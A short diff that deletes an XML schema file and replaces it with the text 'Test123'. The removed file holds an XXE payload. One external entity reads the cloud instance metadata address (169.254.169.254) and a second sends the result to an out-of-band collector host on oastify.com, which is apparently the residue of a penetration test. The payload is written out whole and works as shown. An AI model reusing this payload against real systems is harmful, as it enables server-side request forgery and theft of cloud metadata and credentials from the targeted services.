@@ -1,8 +1,1 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/local-ipv4">
-  <!ENTITY send SYSTEM "http://prk89ib4ki6f8hdy6vhp8r3mjdp5d01p.oastify.com/?data=&xxe;">
-]>
-<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
-  <xs:element name="obq" type="xs:string"/>
-</xs:schema>
+Test123
